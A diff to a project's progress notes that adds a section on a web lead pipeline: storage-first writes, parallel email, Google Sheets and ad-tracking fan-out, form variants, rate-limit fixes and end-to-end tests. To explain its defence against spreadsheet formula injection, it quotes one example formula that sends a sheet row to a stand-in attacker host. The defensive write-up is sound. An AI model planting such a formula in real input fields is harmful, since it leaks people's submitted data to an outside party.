@@ -392,6 +392,43 @@ Gate: typecheck, lint and build clean; **1194 e2e tests passing, 0 failing**.
 `docs/RUNBOOK.md` is now the operational runbook. Build 1's operator guide moved to
 `docs/kit-setup.md`.
 
+### Phase 3: lead pipeline — done
+
+**Sanity is written first and the response depends only on that write.** Build 1 sent an email and
+nothing else, so a Resend outage was a lost customer, and a lead that reached nobody returned the
+same 200 as one that reached the academy.
+
+The fan-out afterwards runs in parallel with retries and every part of it is allowed to fail: the
+academy's email (reply-to the student), an auto-reply, a Google Sheets row, and a Meta CAPI `Lead`
+sharing an `event_id` with the browser's `generate_lead` so the pair is counted once.
+
+- **Three variants.** Student; waitlist, linked to the batch document so the person appears on that
+  batch's roster in the Studio; cafe, routed to `CAFE_TO_EMAIL` with a Cal.com slot on the
+  thank-you page when `NEXT_PUBLIC_CALCOM_LINK` is set, and "the academy will call you" when it is
+  not.
+- **Formula injection is defended twice**, because either defence alone is one config change from
+  being wrong: a leading apostrophe on anything starting `=`, `+`, `-` or `@`, and `RAW` rather than
+  `USER_ENTERED` on the append. `=IMPORTXML("http://attacker/"&A1)` typed into a name field
+  exfiltrates the whole row, and the academy just sees a name.
+- Google Sheets goes through the REST API with a hand-signed service-account JWT, not `googleapis`
+  (about 20MB installed, to make one call).
+- **The auto-reply promises nothing the academy has not confirmed.** Without
+  `siteSettings.replyPromise` it says the academy replies during hours and states no interval:
+  inventing a service level is the same class of error as inventing a price.
+- The enquiry form gains an **optional** email field and Turnstile. Optional on purpose: a phone
+  number is enough to have a conversation, and requiring an email costs leads on this audience.
+
+Two things fixed while testing: the fan-out logged "sent" and "mirrored" when a destination was
+simply not configured, which is how a misconfiguration survives a month; and the enquiry rate limit
+was 20/min per IP, the one defence here that can hurt a real customer, because Indian carriers put
+very large numbers of subscribers behind one CGNAT address.
+
+Gate: typecheck, lint and build clean; **1215 e2e tests passing, 0 failing**, including nine
+pipeline tests against real Sanity that assert the document exists with its course reference, its
+batch link and its campaign; that a honeypot and a too-fast submit create nothing; and that a lead
+survives both optional destinations being absent — not mocked, because this environment genuinely
+has neither.
+
 ---
 
 ## Where this stands, and what to do next
